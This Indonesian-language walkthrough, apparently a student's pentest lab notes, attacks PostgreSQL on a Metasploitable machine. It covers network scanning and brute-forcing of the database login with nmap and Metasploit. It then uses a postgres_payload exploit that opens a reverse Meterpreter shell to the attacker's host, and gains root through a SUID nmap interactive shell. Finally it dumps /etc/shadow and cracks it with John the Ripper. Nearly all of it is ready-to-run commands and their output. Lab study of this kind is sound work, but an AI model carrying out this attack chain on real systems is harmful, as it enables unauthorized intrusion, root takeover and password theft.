# Introduction

**PostgreSQL**, sering disingkat Postgres, adalah sebuah sistem manajemen basis data relasional objek (_Object-Relational Database Management System_ atau ORDBMS) yang bersifat sumber terbuka. Dikenal karena keandalannya, fitur-fiturnya yang canggih, dan kepatuhannya terhadap standar SQL, PostgreSQL sering dianggap sebagai salah satu basis data open-source paling maju di dunia.

Beberapa **kerentanan** yang bisa dieksploitasi:
- Kredensial login lemah
- Eksekusi kode melalui payload
- Hak akses pengguna
- Peningkatan hak akses (_privilege escalation_)

**1. _Reconnaissence_**

- Analisis jaringan yang sedang dipakai untuk mengetahui IP yang digunakan

```
ifconfig
```
- Memindai seluruh jaringan internal yang saling terhubung untuk mencari target
```
nmap -sn <ip_range>

Ex. nmap -sn 192.168.1.0/24   //scanning the whole connected divices
```
**2. _Scanning and Enumeration_**

- Memindai port postgresql 5432 pada IP target
```
nmap -p 5432 --script=psql-brute <ip_metasploitable>
```
Fungsi dari skrip `psql-brute` di Nmap adalah untuk melakukan serangan brute-force terhadap kredensial login pada server basis data PostgreSQL. Bisa juga menambahkan `--script-args userdb=users.txt,passdb=pass.txt` jika ingin menggunakan _wordlist_ tertentu.
- Alternatif lain jika nmap tidak menemukan username dan password (metasploit framework)
```
msfconsole
```
```
search postgresql	
```
```
use auxiliary/scanner/postgres/postgres_login
set RHOSTS <ip_metasploitable>
set LHOST <ip_kali_linux>
exploit	
```
```
[-] 192.168.175.90:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
[+] 192.168.175.90:5432 - Login Successful: postgres:postgres@template1	//username:password@databasebawaan

[*] Scanned 1 of 1 hosts (100% complete)
[*] Bruteforce completed, 1 credential was successful.
[*] You can open a Postgres session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```
- Mencoba login postgres menggunakan kredensial yang ditemukan
Kali Linux:  
```
psql -h [IP_target] -U [username] -d [database]
```
`-h` : Host/IP	`-U` : nama user	`-d` : nama database

Berikut beberpa perintah yang bisa diguakan untuk eksplorasi:

- Mulai dengan `\l` atau `\list` untuk melihat semua basis data.

- Pilih basis data dan gunakan `\c <nama_basis_data>` untuk terhubung.

- Lihat tabel dengan `\dt`.

- Periksa struktur tabel dengan `\d <nama_tabel>`.

- Ambil data dari tabel dengan perintah `SELECT`.

**3. _Gaining Access (Exploitation)_**
- Menjalankan Metasploit Framework
```
msfconsole
```
- Mencari modul eksploitasi yang sesuai dengan kerentanan yang ditemukan

Payload PostgreSQL seringkali digunakan sebagai jembatan untuk mendapatkan shell sistem. Misalnya, sebuah payload dapat dikonfigurasi untuk membuat koneksi _reverse shell_ ke mesin penyerang, yang kemudian akan memberikan akses ke command prompt sistem operasi.

```
search postgres payload
```

```
Matching Modules
================

   #   Name                                                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                                                      ---------------  ----       -----  -----------
   0   exploit/multi/http/manage_engine_dc_pmp_sqli                                              2014-06-08       excellent  Yes    ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection
   1     \_ target: Automatic                                                                    .                .          .      .
   2     \_ target: Desktop Central v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows           .                .          .      .
   3     \_ target: Desktop Central MSP v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows       .                .          .      .
   4     \_ target: Desktop Central [MSP] v7 >= b70200 / v8 / v9 < b90039 (MySQL) on Windows     .                .          .      .
   5     \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Windows  .                .          .      .                           
   6     \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Windows             .                .          .      .
   7     \_ target: Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Linux    .                .          .      .                           
   8     \_ target: Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Linux               .                .          .      .
   9   exploit/windows/misc/manageengine_eventlog_analyzer_rce                                   2015-07-11       manual     Yes    ManageEngine EventLog Analyzer Remote Code Execution
   10  exploit/multi/postgres/postgres_copy_from_program_cmd_exec                                2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   11    \_ target: Automatic                                                                    .                .          .      .
   12    \_ target: Unix/OSX/Linux                                                               .                .          .      .
   13    \_ target: Windows - PowerShell (In-Memory)                                             .                .          .      .
   14    \_ target: Windows (CMD)                                                                .                .          .      .
   15  exploit/linux/postgres/postgres_payload                                                   2007-06-05       excellent  Yes    PostgreSQL for Linux Payload Execution
   16    \_ target: Linux x86                                                                    .                .          .      .
   17    \_ target: Linux x86_64                                                                 .                .          .      .
   18  exploit/windows/postgres/postgres_payload                                                 2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution
   19    \_ target: Windows x86                                                                  .                .          .      .
   20    \_ target: Windows x64                                                                  .                .          .      .
```

- Memilih dan mengatur eksploitasi
```
use exploit/linux/postgres/postgres_payload
set RHOSTS <ip_metasploitable>
set LHOST <ip_kali_linux>
set USERNAME <username_psql>
set PASSWORD <password_psql>
```
- Cek _requirement_, pastikan tidak ada yang kurang atau terlewat
```
show options
```
- Jika sudah lengkap, jalankan serangan
```
exploit
```

```
*] Started reverse TCP handler on 192.168.175.235:4444 
[*] 192.168.175.90:5432 - PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)
[*] Uploaded as /tmp/ZPGWeSoT.so, should be cleaned up automatically
[*] Sending stage (1017704 bytes) to 192.168.175.90
[*] Meterpreter session 1 opened (192.168.175.235:4444 -> 192.168.175.90:49232) at 2025-08-15 02:01:59 -0400

meterpreter >
```

**4. _Maintaining accsess dan Post exploitation_**
- Mencari informasi sistem
```
meterpreter > sysinfo
Computer     : metasploitable.localdomain
OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture : i686
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: postgres
```


5. **_Privilege escalation_**

- Menggunakan shell linux untuk eksplorasi
```
meterpreter > shell
```
```
whoami
```
- Cek login root
```
sudo -i, atau
sudo -l
```
- Jika tidak bisa login, cari kerentanan lain (shell meterpreter)
```
meterpreter > run post/multi/recon/local_exploit_suggester
```
```
[*] 192.168.175.90 - Valid modules for session 1:
============================
 #   Name                                                               Potentially Vulnerable?  Check Result
 -   ----                                                               -----------------------  ------------
 1   exploit/linux/local/glibc_ld_audit_dso_load_priv_esc               Yes                      The target appears to be vulnerable.
 2   exploit/linux/local/glibc_origin_expansion_priv_esc                Yes                      The target appears to be vulnerable.
 3   exploit/linux/local/netfilter_priv_esc_ipv4                        Yes                      The target appears to be vulnerable.
```
- Pilih dan gunakan modul yang disarankan (bertanda YES)
```
Meterpreter > backgroud		//kembali ke msf tanpa keluar session 
sessions				          //cek session yang tersedia
use [modul]			        	//pilih modul hasil scanning
set RHOSTS [IP_target]		//atur IP target
set LHOST [IP_attacker]		//atur IP penyerang
set SESSION [ID_session]	//atur session yang dipilih
run				               	//jalankan modul
sessions -i [id]		    	//untuk kembali ke meterpreter
```
- Jika semua modul sudah dicoba dan masih gagal, cari kerentanan yang lain
```
meterpreter > shell
```
- Mencari SUID binary yang rentan
```
find / -perm -u=s -type f 2>/dev/null
```
```
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/nmap	         //memanfaatkan celah pada versi nmap lama
/usr/bin/chsh
/usr/bin/netkit-rcp
/usr/bin/passwd
```
Versi Nmap yang lama memiliki mode interaktif (_--interactive_) yang memungkinkan pengguna menjalankan perintah shell dengan hak akses root. Saat menjalankan Nmap dalam mode interaktif (_--interactive_), pengguna akan mendapatkan prompt nmap>. Pada titik ini, Nmap tidak lagi berfungsi sebagai pemindai, tetapi sebagai antarmuka interaktif yang dapat mengeksekusi perintah-perintah internalnya sendiri. Jadi, ketika pengguna mengetik !sh atau !bash, pengguna memberitahu Nmap untuk "jalankan shell baru untuk saya".
- Eksploitasi akses root pada celah ini
```
/usr/bin/nmap -–interactive
```
```
nmap> !sh
```
- Cek hak akses user setelah  eksploitasi
```
whoami
```
Jika berhasil, maka hak akses akan berubah menjadi root user

**6. _Cracking Password_**

- Memanfaatkan akses root untuk mendapatkan password
```
cat /etc/shadow/
```
- Buka terminal baru (kali linux) dan paste isi file tersebut ke file yang baru
```
sudo nano <file_password>.txt
```
- _Cracking_ file password menggunakan JohnTheRipper
```
john –-wordlist=<directory_wordlist> <file_password>.txt
```
```
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
```
Jika ingin menggunakan **rockyou.txt**, pastikan sudah di ungzip sebelumnya supaya file bisa digunakan.

John the Ripper akan mencoba mencocokkan hash dengan kata-kata dalam daftar dan akan menampilkan kata sandi yang berhasil di-_crack_ di layar. Jika berhasil, pengguna akan mendapatkan kata sandi dalam bentuk teks biasa (misalnya, msfadmin atau toor).
